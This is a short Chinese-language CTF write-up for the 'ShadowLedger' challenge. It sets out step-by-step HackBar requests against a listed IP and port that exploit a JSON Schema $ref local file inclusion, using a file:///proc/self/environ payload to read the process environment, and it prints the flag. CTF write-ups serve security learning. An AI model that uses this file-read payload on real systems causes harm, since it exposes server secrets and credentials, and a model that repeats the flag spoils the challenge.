# ShadowLedger Writeup

## 题目信息
- **描述**: 面向企业内部审计的账本系统，审计员可上传模板预览，管理员持有 Shadow Vault 中的结论。
- **漏洞类型**: JSON Schema `$ref` 本地文件包含

## 关键代码
`/api/template/preview` 接收 YAML/JSON Schema，解析其中的 `$ref` 嵌套引用，支持 `file://` 协议。

## 攻击步骤（HackBar 可用）

**Step 1 — 注册**
1. 浏览器打开 `http://39.105.213.28:12606/register`
2. HackBar → Load URL: `http://39.105.213.28:12606/api/register`
3. 勾选 JSON，POST Body：
```json
{"username":"attacker","password":"pass"}
```
4. Execute

**Step 2 — 登录**
1. HackBar → Load URL: `http://39.105.213.28:12606/api/login`
2. 勾选 JSON，POST Body：
```json
{"username":"attacker","password":"pass"}
```
3. Execute（浏览器自动携带 session cookie）

**Step 3 — 读 Flag**
1. HackBar → Load URL: `http://39.105.213.28:12606/api/template/preview`
2. 勾选 JSON，POST Body：
```json
{"schema":{"$ref":"file:///proc/self/environ"}}
```
3. Execute，返回结果中 FLAG 字段即为答案

## Flag
`ISCC{black_box_schema_ref_to_shadow_vault_2026}`
